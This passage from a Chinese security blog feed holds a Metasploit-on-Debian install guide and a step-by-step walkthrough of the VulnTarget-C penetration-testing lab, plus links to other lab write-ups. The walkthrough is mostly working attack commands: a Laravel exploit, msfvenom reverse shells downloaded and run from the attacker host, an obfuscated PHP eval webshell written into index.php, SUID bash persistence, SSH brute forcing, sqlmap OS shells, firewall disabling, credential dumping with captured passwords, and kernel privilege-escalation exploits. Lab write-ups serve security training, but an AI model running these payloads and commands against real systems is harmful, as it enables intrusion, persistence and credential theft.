operator">-</span>version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/39bf/4.png" class><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><blockquote><p><a href="https://blog.csdn.net/weixin_42917830/article/details/94406566">(86条消息) Debian 上安装 java | openjdk8的方法 使用Amazon Correo解决Package ‘openjdk-8-jdk’ has no installation candidate_俊隽X的博客-CSDN博客</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Debian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Debian安装MSF</title>
      <link href="/post/1e11.html"/>
      <url>/post/1e11.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、更新源并安装MSF"><a href="#一、更新源并安装MSF" class="headerlink" title="一、更新源并安装MSF"></a>一、更新源并安装MSF</h3><ol><li>写入kali linux的官方源</li></ol><pre class="line-numbers language-none"><code class="language-none">vi &#x2F;etc&#x2F;apt&#x2F;sources.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main contrib non-freedeb http:&#x2F;&#x2F;old.kali.org&#x2F;kali sana main non-free contrib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/1e11/1.png" class><ol start="2"><li>更新源</li></ol><pre class="line-numbers language-none"><code class="language-none">apt-get update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>出现下面的报错</p><img src="/post/1e11/2.png" class><p><strong>解决方法：</strong></p><p>（1）我使用的是这个方法，就成功解决问题</p><pre class="line-numbers language-none"><code class="language-none">wget -q -O - https:&#x2F;&#x2F;archive.kali.org&#x2F;archive-key.asc | apt-key add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）第一个方法不起作用，可以试试这个</p><pre class="line-numbers language-none"><code class="language-none">apt-key adv --keyserver hkp:&#x2F;&#x2F;keys.gnupg.net --recv-keys ED444FF07D8D0BF6dpkg --configure -a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>安装MSF</li></ol><pre class="line-numbers language-none"><code class="language-none">apt-get install metasploit-framework<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="二、安装并配置postgresql数据库"><a href="#二、安装并配置postgresql数据库" class="headerlink" title="二、安装并配置postgresql数据库"></a>二、安装并配置postgresql数据库</h3><ol><li>安装postgresql数据库（metasploit需要它支持）</li></ol><pre class="line-numbers language-none"><code class="language-none">apt-get install postgresql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/1e11/2-1.png" class><ol start="2"><li>为postgresql安装时自动添加的postgres用户设置密码。</li></ol><p> <strong>注意</strong>：切换到postgres用户，如果报No directory, logging in with HOME&#x3D;&#x2F;，那么需要进行创建 ，并赋予权限，rw和可执行*</p><pre class="line-numbers language-none"><code class="language-none">sudo passwd postgressu postgresmkdir &#x2F;home&#x2F;postgres<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="3"><li>在postgres用户进行数据库配置，创建metasploit的数据库和用户</li></ol><pre class="line-numbers language-none"><code class="language-none">createuser msf -P -S -R -D  #创建用户createdb -O msf msf         #创建数据库 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/1e11/2-3.png" class><ol start="4"><li>检测能否连上postgresql数据库,我没有连接到</li></ol><pre class="line-numbers language-none"><code class="language-none">msfconsole db_status连接正常显示： [*] postgresql connected to msf3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/post/1e11/2-4.png" class><h3 id="三、配置metasploit数据库的连接"><a href="#三、配置metasploit数据库的连接" class="headerlink" title="三、配置metasploit数据库的连接"></a>三、配置metasploit数据库的连接</h3><ol><li>在metasploit的安装目录下新建<code>database.yml</code>文件</li></ol><pre class="line-numbers language-none"><code class="language-none"># 我的metasploit的安装目录：&#x2F;usr&#x2F;share&#x2F;metasploit-framework<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"># 填写内容production:     adapter: postgresql     database: msf     username: msf     password: gg   # 自己设置的密码   host: 127.0.0.1     port: 5432     pool: 75     timeout: 5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li><p>进入msf中执行下面命令</p><pre class="line-numbers language-none"><code class="language-none">db_connect -y &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;databa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>如果上面执行失败，数据库还是没有连接执行下面命令。使用非root用户执行MSF进行初始化。</p><p><strong>注意：</strong>初次运行msf会创建数据库，但是msf默认使用的PostgreSQL数据库不能与root用户关联，这也这也就是需要新建用户postgres来运行metasploit的原因所在。</p></li></ol><pre class="line-numbers language-none"><code class="language-none">msfdb reinit msfconsoledb_status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/post/1e11/3-2.png" class><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><blockquote><p><a href="https://blog.csdn.net/weixin_30632883/article/details/99546882?ops_request_misc=&request_id=&biz_id=102&utm_term=debian%E5%AE%89%E8%A3%85msf&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-99546882.142%5Ev88%5Ekoosearch_v1,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">(86条消息) Debian更新源加安装Metespolit&amp;&amp;Cobalt Strike_weixin_30632883的博客-CSDN博客</a></p><p><a href="https://www.codenong.com/cs106677168/">Kali Linux 更新失败NO_PUBKEY ED444FF07D8D0BF6解决办法 | 码农家园 (codenong.com)</a></p><p>[(86条消息) <a href="https://blog.csdn.net/kjuhfkicf154/article/details/128667364?ops_request_misc=%7B%22request_id%22:%22168845882316782425196301%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168845882316782425196301&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-5-128667364-null-null.142%5Ev88%5Ekoosearch_v1,239%5Ev2%5Einsert_chatgpt&utm_term=debian%E5%AE%89%E8%A3%85msf&spm=1018.2226.3001.4187">2023最新]Metasploit(MSF)下载安装及使用详解，永久免费使用，环境配置和使用技巧指南_msf软件_网络安全工程师教学的博客-CSDN博客</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Debian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶机-VulnTarget-C</title>
      <link href="/post/d9dd.html"/>
      <url>/post/d9dd.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h3><ol><li>靶机下载地址：</li></ol><blockquote><p>百度云：<a href="https://pan.baidu.com/s/1p3GDd7V3Unmq3-wSAvl7_Q">https://pan.baidu.com/s/1p3GDd7V3Unmq3-wSAvl7_Q</a> </p><p>提取码:1p9p</p></blockquote><ol start="2"><li>靶机网络配置</li></ol><p><strong>方法一：</strong>直接通过默认用户密码进行登录修改</p><pre class="line-numbers language-none"><code class="language-none">Ubuntu20:root&#x2F;root#qwe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>方法二：</strong></p><p>（1）开启靶机，按shift键再按E键进入界面之中，修改</p><pre class="line-numbers language-none"><code class="language-none">rw----&gt;rw signiinit&#x3D;&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）完成修改之后按Ctrl+X进入shell界面</p><p>（3）修改&#x2F;etc&#x2F;netplan下的网络配置文件，将网络ip改成自己的网段ip</p><p><strong>备注：</strong>Netplan —— 抽象<a href="https://so.csdn.net/so/search?q=%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE&spm=1001.2101.3001.7020">网络配置</a>生成器 ，是一个用于配置 Linux 网络的简单工具</p><pre class="line-numbers language-none"><code class="language-none">ip -a      ## 查看当前网卡信息cd &#x2F;etc&#x2F;netplanvi 00-installer-config.yaml修改内容为：ens33：addresses:自己的网段ipgateway4:自己网段的网关<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/d9dd/1-1.jpg" class><p>（4）保存配置，让配置生效</p><pre class="line-numbers language-none"><code class="language-none">netplan apply<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/d9dd/1-2.jpg" class><h3 id="二、边界主机"><a href="#二、边界主机" class="headerlink" title="二、边界主机"></a>二、边界主机</h3><h4 id="（一）-信息收集"><a href="#（一）-信息收集" class="headerlink" title="（一） 信息收集"></a>（一） 信息收集</h4><p>1.主机发现，查看目标靶机的ip:192.168.12.8</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">nmap 192.168.12.1/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/d9dd/2-1.jpg" class><p>2.对目标靶机进行详细的 端口扫描，发现开放了22端口和80端口</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">nmap -sT -A -sV  192.168.12.8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/d9dd/2-2.jpg" class><p>3.对80端口进行访问，发现是Laravel框架。查看Laravel版本号对应的漏洞发现存在CVE-2021-03129漏洞</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">项目下载地址：git clone https://github.com/SNCKER/CVE-2021-3129cd CVE-2021-3129git clone https://github.com/ambionics/phpggc.git（exp执行需要使用此工具)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/d9dd/2-3.jpg" class><h4 id="（二）漏洞利用"><a href="#（二）漏洞利用" class="headerlink" title="（二）漏洞利用"></a>（二）漏洞利用</h4><p>1.修改项目中<code>exploit.py</code>文件将<code>main()</code>函数中的<code>Exp()</code>函数接受参数修改为目标站点地址与要执行的命令</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#修改位置def main():    Exp("http://192.168.12.8:80", "whoami")#执行命令python3 exploit.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/d9dd/2-4.jpg" class><img src="/post/d9dd/2-5.jpg" class><p>2.利用msf生成反向木马，并开启HTTP服务</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.12.172 LPORT=8181 -f elf -o 11.elfpython3 -m http.server 9090<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/d9dd/2-6.jpg" class><p>3.kali攻击机上开启监听等待shell的反弹,修改exploit.py执行的命令—-&gt;反弹失败</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">use exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcpset lhost 192.168.12.172set lport 8181run# 修改执行的命令：wget http://192.168.12.172:9090/11.elf&amp;&amp;chmod 777 11.elf&amp;&amp;./11.elf# 命令执行python3 exploit.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4.通过执行ls命令，发现当前目录为根目录。当前的用户为网站用户可能没有在根目录下载的权限，需要到网站目录下去尝试执行。</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain"># 通过命令执行探测出网站的根目录为：/var/www/html# 修改执行的命令：cd /var/www/html/public&amp;&amp;wget http://192.168.12.172:9090/11.elf&amp;&amp;chmod 777 11.elf&amp;&amp;./11.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/d9dd/2-7.jpg" class><h4 id="（三）提权-1"><a href="#（三）提权-1" class="headerlink" title="（三）提权-1"></a>（三）提权-1</h4><p>1.利用模块扫描可提权的漏洞模块,发现cve_2021_4034这一漏洞模块</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">run post/multi/recon/local_exploit_suggester<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/d9dd/2-8.jpg" class><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexecset session 2run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/post/d9dd/2-9.jpg" class><img src="/post/d9dd/2-10.jpg" class><h4 id="（三）提权-2"><a href="#（三）提权-2" class="headerlink" title="（三）提权-2"></a>（三）提权-2</h4><p>1.查看&#x2F;home目录下用户有哪些。发现存在<code>vulntarget</code>用户尝试使用Hydra进行SSH爆破，获得密码root</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">hydra -l vulntarget -P passwd.txt 192.168.12.8 ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/d9dd/2-11.jpg" class><p>2.ssh登录靶机，利用sudo提权，发现&#x2F;opt&#x2F;root.py文件，进行查看</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/d9dd/2-12.jpg" class><p>3.查看&#x2F;opt&#x2F;root.py文件内容。运行脚本会在本地的<code>1025-65535</code>端口上开启一个<code>socket</code>接口且密码是<code>mortals</code>登录成功后根据选项给出响应的回显如果有错误的输入在异常处理处打印异常且调用<code>pdb</code>模块，同时进入到调式模块下在此模块中可导入<code>OS</code>模块来执行系统命令完成提权</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#!/usr/bin/env python3import socketimport randomimport subprocessimport pdbport = random.randint(1025, 65535)  try:    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)    sock.bind(('127.0.0.1', port))    sock.listen(1)    print(f'Listening on localhost:&#123;port&#125;')        (clientsock, addr) = sock.accept()     clientsock.send(b'Enter the secret passsword: ')      if clientsock.recv(1024).strip().decode() != 'mortals':        clientsock.send(b'Wrong password!\n')    else:        clientsock.send(b'Welcome admin!\n')        while True:            clientsock.send(b'\nWhat do you wanna do: \n')            clientsock.send(b'[1] View processes\n')            clientsock.send(b'[2] View free memory\n')            clientsock.send(b'[3] View listening sockets\n')            clientsock.send(b'[4] Quit\n')            option = int(clientsock.recv(1024).strip())            if option == 1:                clientsock.send(subprocess.getoutput('ps aux').encode())            elif option == 2:                clientsock.send(subprocess.getoutput('df').encode())            elif option == 3:                clientsock.send(subprocess.getoutput('ss -lnt').encode())            elif option == 4:                clientsock.send(b'Bye\n')                breakexcept Exception as e:    print(e)    pdb.post_mortem(e.__traceback__)finally:    quit()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4.提权操作。在第一个ssh链接上执行脚本文件，另外开启一个ssh链接监听脚本开启的端口并进行错误的输入</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">SSH1:sudo python3 root.pySSH2:nc localhost randomportmortalsaSSH1:import osos.system("whoami")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/d9dd/2-13.jpg" class><img src="/post/d9dd/2-14.jpg" class><p>5.进行权限维持。赋予用户的Shell为SUID权限一次来为维权，调用具有SUID Shell</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">import osos.system("chmod u+s /bin/bash")bash -p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/post/d9dd/2-15.jpg" class><p>6.利用MSF生成反向木马，通过http服务进行上传后执行反弹回最高权限的shell。进行添加路由进行内网攻击</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#Kali操作msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.12.172 lport=8181 -f elf -o 4321.elfPyhont2 -m SimpleHTTPServer 9090#Ubuntu 20操作wget http://192.168.12.172:9090/11.elfchmod 777 11.elf./11.elf#meterpreter操作getuidrun post/multi/manage/autoroute<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/d9dd/2-16.jpg" class><h3 id="三、二层内网"><a href="#三、二层内网" class="headerlink" title="三、二层内网"></a>三、二层内网</h3><h4 id="（一）信息收集"><a href="#（一）信息收集" class="headerlink" title="（一）信息收集"></a>（一）信息收集</h4><p>1.进行信息收集，发现存在其它网卡信息。添加路由信息，调用MSF的模块对内网信息进行扫描。</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">meterpreter>run post/multi/manage/autoroute  #添加路由meterpreter>run autoroute -p    #查看路由<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/d9dd/3-1.jpg" class><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">use auxiliary/scanner/portscan/tcpset rhost 10.0.20.0/24set ports 21,22,80,135,139,445,8080set threads 30run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/d9dd/3-2.jpg" class><p>2.发现一个内网主机10.0.20.100开放80端口，在MSF上开启socks代理服务器，并对站点进行访问</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">use auxiliary/server/socks_proxyset srvport 1088run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/post/d9dd/3-3.jpg" class><p>3.在右上角有<code>Admin Login</code>按钮点击可进入后台登录页面，在此可配置BP的<code>SOCKS5</code>代理进行抓包爆破</p><img src="/post/d9dd/3-4.jpg" class><h4 id="（二）漏洞利用-1"><a href="#（二）漏洞利用-1" class="headerlink" title="（二）漏洞利用"></a>（二）漏洞利用</h4><p>1.利用BP开启抓包代理，进行登录用户和密码的破解</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#代理流程Browser&lt;--->BurpSuite&lt;--->Socks Proxy Server&lt;--->WebSite#步骤设置1.开启BurpSuite进入Settings选中Network中Connections找到SOCKS Proxy2.勾选Override user options并且填写Use SOCKS proxy下的host与port为MSF开启的代理地址与端口3.回到火狐浏览器设置BP代理为HTTP类型的127.0.0.1:8080与MSF的SOCKS5类型代理4.先挂MSF的代理访问站点到用户登录界面要抓取的数据包，在挂BP的代理且在BP的Proxy模块开启监听5.此时已经设置了浏览器的数据走BP，而BP抓到的数据走SOCKS5代理，抓取登陆请求的HTTP数据包...注：此种方式也可隐藏自身IP地址...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/d9dd/3-5.jpg" class><img src="/post/d9dd/3-6.jpg" class><p>2.爆破出账号密码为：admin&#x2F;admin123,登录后台</p><img src="/post/d9dd/3-7.jpg" class><p>3.该OVAS CMS后台存在SQL注入，在此后台页面点击<code>Inquiries</code>–&gt;<code>Action</code>–&gt;<code>View</code>使用BP抓取到数据包且保存到本地文件中</p><img src="/post/d9dd/3-8.jpg" class><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">GET /admin/inquiries/view_details.php?id=1 HTTP/1.1Host: 10.0.20.100User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestConnection: closeReferer: http://10.0.20.100/admin/?page=inquiriesCookie: PHPSESSID=om8dmq1kfbqgcu76558m0su56s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4.使用SQLMAP对其抓取的HTTP请求包进行SQL注入测试（代理不好使，部署FRP获取代理），发现存在SQL注入</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">proxychains sqlmap -r insql.txt --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>部署FRP获取代理</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#frps.ini[common]bind_port = 8282#frpc.ini[common]server_addr = 192.168.12.172  -->Kali IP地址server_port = 8282[plugin_socks]type = tcpremote_port = 1082    --->Socks5端口plugin = socks5#Command CodeKali:./frps -c frps.iniUbuntu 20:./frpc -c frpc.ini<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/d9dd/3-9.jpg" class><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">sqlmap -r insql.txt --proxy=socks5://192.168.12.172:1082 --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/d9dd/3-10.jpg" class><p>5.在该SQL注入点获取OS Shell并写入一句话木马…将一句话木马替换到index.php文件中</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#判断是否BDAsqlmap -r insql.txt --proxy=socks5://192.168.12.172:1082 --batch --is-dba#获取交互式Shellsqlmap -r insql.txt --proxy=socks5://192.168.12.172:1082 --os-shell#写入免杀一句话木马echo ^&lt;^?php $a = $_REQUEST['d'];$a = "$a";$b['test'] = "";eval($b['test']."$a");?^>^ > test.php#替换index.php文件echo ^&lt;^?php $a = $_REQUEST['d'];$a = "$a";$b['test'] = "";eval($b['test']."$a");?^>^ > index.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/d9dd/3-11.jpg" class><img src="/post/d9dd/3-12.jpg" class><p>6.蚁剑添加代理，进行连接</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">http://10.0.20.100/admin/?page=inquiries | d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/d9dd/3-13.jpg" class><img src="/post/d9dd/3-14.jpg" class><p>7.上线msf，利用MSF生成正向木马上传执行获得shell</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#生成木马msfvenom -p windows/x64/meterpreter/bind_tcp  LPORT=8383 -f exe > insec.exe#防火墙操作netsh advfirewall show allprofile state      //查看防火墙状态netsh advfirewall set  allprofile state off  //关闭防火墙#监听链接use exploit/multi/handlerset payload windows/x64/meterpreter/bind_tcpset lport 8383set rhost 10.0.20.100run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/d9dd/3-15.jpg" class><img src="/post/d9dd/3-16.jpg" class><p>8.对当前内网进行信息收集</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#执行命令systeminfoipconfig /allload kiwihashdump    ——>   Administrator dfc8d2bfa540a0a6e2248a82322e654e/Admin#123creds_all   ——>   dfc8d2bfa540a0a6e2248a82322e654e Admin#123run getgui -enetstat -an | findstr 3389   tasklist /svc ——>   MsMpEng.exe &lt;=> Windows Defender#收集信息OS:Wins16NIC1：10.0.20.100/24NIC2：10.0.10.139/24username:administraotrpassword:Admin#123RDP Port:3389<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/d9dd/3-17.jpg" class><img src="/post/d9dd/3-18.jpg" class><p>9.添加路由并扫描<code>10.0.10.0</code>网段的机器，发现主机<code>10.0.10.110</code>存活。</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#添加路由信息run post/multi/manage/autoroute#扫描内网存活主机use auxiliary/scanner/portscan/tcpset rhosts 10.0.10.0/24set ports 22,23,80,445,3306set threads 20run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/d9dd/3-19.jpg" class><h3 id="四、三层内网"><a href="#四、三层内网" class="headerlink" title="四、三层内网"></a>四、三层内网</h3><p>1.使用以上抓取破解出的账户密码远程登录到内网Windows主机上</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#代理配置vi /etc/proxychains4.confsocks5 127.0.0.1 1082#桌面链接proxychains rdesktop 10.0.20.100----》失败，连接出错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开3389端口</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /fnetstat -ano | findstr "3389"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/post/d9dd/4-1.jpg" class><p>直接本地通过SocksCap64代理进行远程连接，成功连接到远程桌面</p><details class="lake-collapse"><summary id="ucebf9899"></summary><p id="uc84f9655" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Administrator:::Admin#123</span></p></details><img src="/post/d9dd/4-2.jpg" class><img src="/post/d9dd/4-3.jpg" class><p>2.在下方看到<code>MobaXterm</code>打开后需要输入密码使用本机管理员密码登录成功，且存在一Linux主机为上面扫描出来的内网机器，点开后为<code>vulntarget</code>普通用户登录</p><img src="/post/d9dd/4-4.jpg" class><p>3.方法一：直接通过MobaXterm查看密码，点击上方的Settings按照流程进行点击，需要输入登录用户的密码即：Admin#123</p><img src="/post/d9dd/4-5.jpg" class><img src="/post/d9dd/4-6.jpg" class><img src="/post/d9dd/4-7.jpg" class><p>成功获取到10.0.10.110中的用户vulntarget的密码为vuln@qwe，利用sudo进行提权</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">sudo su<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/d9dd/4-8.jpg" class><p>方法二：根据Linux内核版本尝试提权，将提权项目下载至本地并编译好上传至<code>Wins16</code>在拖进LinuxShell中执行之后即可提权成功…获取<code>Flag</code></p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#uname -a Linux ubuntu 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux#项目地址https://github.com/briskets/CVE-2021-3493#执行命令gcc exploit.c -o exploit./exploit#flag内容vulntarget&#123;cve_2021_3493_local_privilege_promotion_overlayfs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/d9dd/4-9.jpg" class>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> Vulntarget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>其它打靶流程</title>
      <link href="/post/b3a8.html"/>
      <url>/post/b3a8.html</url>
      
        <content type="html"><![CDATA[<p><strong>备注</strong>：由于先前没有搭好自己的博客，先前的打靶流程都放在csdn上了。</p><h3 id="打靶流程地址"><a href="#打靶流程地址" class="headerlink" title="打靶流程地址"></a>打靶流程地址</h3><blockquote><p><a href="https://blog.csdn.net/weixin_58602402/article/details/131181620">(85条消息) 靶机-HackNos-2.1_二和不会的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_58602402/article/details/131196991">(85条消息) 靶机-HackNos-3_二和不会的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_58602402/article/details/131200489">(85条消息) 靶场-Matrix-v3_二和不会的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_58602402/article/details/131205960">(85条消息) 靶机-DarkHole_2_二和不会的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_58602402/article/details/131239553">(85条消息) 靶场-DarkHole1_二和不会的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_58602402/article/details/131243037">(85条消息) 靶场-y0usef_二和不会的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_58602402/article/details/131245276">(85条消息) 靶场-Hacker_Kid-v1.0.1_二和不会的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_58602402/article/details/131248384">(85条消息) 靶机-AdmX_new_二和不会的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_58602402/article/details/131280852">(85条消息) 靶场-vulntarget-b_二和不会的博客-CSDN博客</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> 网安 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶机-Hackme2</title>
      <link href="/post/ed54.html"/>
      <url>/post/ed54.html</url>
      
